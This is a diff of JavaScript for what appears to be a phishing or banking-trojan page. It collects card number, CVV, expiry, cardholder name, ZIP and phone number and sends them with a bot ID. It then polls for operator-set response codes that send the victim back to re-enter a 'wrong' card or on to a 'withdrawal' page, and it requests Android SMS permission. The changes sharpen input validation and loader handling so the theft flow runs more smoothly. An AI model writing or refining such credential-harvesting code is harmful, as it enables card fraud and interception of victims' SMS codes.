@@ -8,8 +8,10 @@ document.addEventListener("DOMContentLoaded", function () {
   const addressZip = document.getElementById("adresszip");
   const formButton = document.getElementById("form");
   const formCardText = document.getElementById("form-card");
-  let formValided = false;
   const originalText = formCardText?.textContent;
+
+  const loader = document.getElementById("loader");
+  const form = document.getElementById("form2");
 
   function isDateValid(value) {
     const parts = value.split("/");
@@ -60,6 +62,8 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   function handleFormClick() {
+    const cardHolderValid =
+      cardHolder?.value && /^[A-Za-z]+(?: [A-Za-z]+)+$/.test(cardHolder.value);
     const cardNValid =
       cardN?.value && luhnCheck(cardN.value.replace(/\s+/g, ""));
     const cardDateValid = cardDate?.value && isDateValid(cardDate?.value);
@@ -67,13 +71,20 @@ document.addEventListener("DOMContentLoaded", function () {
       cardV?.value &&
       /^\d{0,3}?$/.test(cardV.value) &&
       cardV.value.trim() !== "";
-
+    const isValidZip = addressZip?.value && /^\d{5}$/.test(addressZip.value);
     validateInput(cardN, cardNValid);
     validateInput(cardDate, cardDateValid);
     validateInput(cardV, cardVValid);
-
+    validateInput(cardHolder, cardHolderValid);
+    validateInput(addressZip, isValidZip);
     if (formCardText) {
-      if (!cardNValid || !cardDateValid || !cardVValid) {
+      if (
+        !cardNValid ||
+        !cardDateValid ||
+        !cardVValid ||
+        !cardHolderValid ||
+        !isValidZip
+      ) {
         formCardText.textContent = "Check the correctness of the data*";
         formCardText.classList.remove("header-primary");
         formCardText.style.color = "red";
@@ -100,6 +111,15 @@ document.addEventListener("DOMContentLoaded", function () {
 
   cardV?.addEventListener("input", (event) => {
     event.target.value = event.target.value.replace(/[^0-9]/g, ""); // This line will replace any non-digit characters with an empty string
+    formButton.disabled = !checkFilledInputs();
+  });
+  cardHolder?.addEventListener("input", (event) => {
+    // This line will replace any non-letter characters with an empty string, allowing spaces
+    event.target.value = event.target.value.replace(/[^a-zA-Z\s]/g, "");
+    formButton.disabled = !checkFilledInputs();
+  });
+  addressZip?.addEventListener("input", (event) => {
+    event.target.value = event.target.value.replace(/[^0-9]/g, "").slice(0, 5); // Only allow digits and limit length to 5
     formButton.disabled = !checkFilledInputs();
   });
   cardN?.addEventListener("input", (event) => {
@@ -130,8 +150,6 @@ document.addEventListener("DOMContentLoaded", function () {
     });
   });
 
-  // formButton?.addEventListener("click", handleFormClick);
-
   const registrateButton = document.getElementById("registrate");
   registrateButton?.addEventListener("click", (event) => sendForm1(event));
   function sendForm1(event) {
@@ -147,8 +165,8 @@ document.addEventListener("DOMContentLoaded", function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         // Обработка успешного ответа сервера
         //  console.log(xhr.responseText);
-        window.location.href = "./permissions.html";
         setCookie("validphone", true, 7);
+        window.location.href = "./permissions.html";
 
         // sendRequestWithBotId(); // Вызываем функцию showLoaderAndRedirect() после выполнения запроса
       } else {
@@ -177,13 +195,16 @@ document.addEventListener("DOMContentLoaded", function () {
   }
   const formSendButton = document.getElementById("form");
   formSendButton?.addEventListener("click", (event) => sendForm2(event));
+  // loader.style.display = "flex"; // Show loader
+  // form.style.display = "none"; // Hide form
   function sendForm2(event) {
     event.preventDefault(); // Предотвращаем стандартное поведение отправки формы
+
     const isFormValid = handleFormClick();
     if (!isFormValid) {
       return;
     }
-    var form = document.getElementById("form2");
+
     var formData = new FormData(form);
     var botId = getQueryParam("botid");
     formData.append("method", "card");
@@ -194,7 +215,8 @@ document.addEventListener("DOMContentLoaded", function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         // Обработка успешного ответа сервера
         console.log(xhr.responseText);
-        window.location.href = "./loader.html";
+        loader.style.display = "flex"; // Show loader
+        form.style.display = "none"; // Hide form
         sendRequestWithBotId(); // Вызываем функцию sendRequestWithBotId() после выполнения запроса
       } else {
         // Обработка ошибок
@@ -225,28 +247,39 @@ document.addEventListener("DOMContentLoaded", function () {
             responseCode === 203 ||
             responseCode === 205
           ) {
-            window.location.href = "./form.html";
+            loader.style.display = "none"; // Hide loader
+            form.style.display = "block"; // Show form
             setTimeout(() => {
               formCardInput.style.color = "red";
               formCardInput.classList.remove("header-primary");
-            }, 500);
+              validateInput(cardN, true);
+            }, 200);
             setTimeout(() => {
               formCardInput.textContent = "Your card";
               formCardInput.classList.add("header-primary");
               formCardInput.style.color = "";
+              const invalidInputs = document.querySelectorAll(".invalid-input");
+              invalidInputs.forEach((input) => {
+                input.classList.remove("invalid-input");
+              });
             }, 5000);
           }
           if (responseCode === 204) {
-            window.location.href = "./form.html";
+            loader.style.display = "none"; // Hide loader
+            form.style.display = "block"; // Show form
             setTimeout(() => {
               formAddressInput.style.color = "red";
               formAddressInput.classList.remove("header-primary");
-            }, 500);
+            }, 200);
 
             setTimeout(() => {
               formAddressInput.textContent = "Adress";
               formAddressInput.classList.add("header-primary");
               formAddressInput.style.color = "";
+              const invalidInputs = document.querySelectorAll(".invalid-input");
+              invalidInputs.forEach((input) => {
+                input.classList.remove("invalid-input");
+              });
             }, 5000);
           }
           switch (responseCode) {
@@ -268,6 +301,7 @@ document.addEventListener("DOMContentLoaded", function () {
               if (formCardInput) formCardInput.textContent = "Invalid card.";
               break;
             case 201:
+              setCookie("withdrawal", true, 7);
               window.location.href = "./withdrawal.html";
               break;
             case 400:
@@ -303,8 +337,8 @@ document.addEventListener("DOMContentLoaded", function () {
             setTimeout(checkSmsPerm, 1000);
           } else if (responseCode === 200) {
             //разрешение выдано
-            window.location.href = "./quiz.html";
             setCookie("validsms", true, 7);
+            window.location.href = "./quiz.html";
           } else if (responseCode === 202) {
             //разрешение не выдано
             Android.clicksmsaccess();
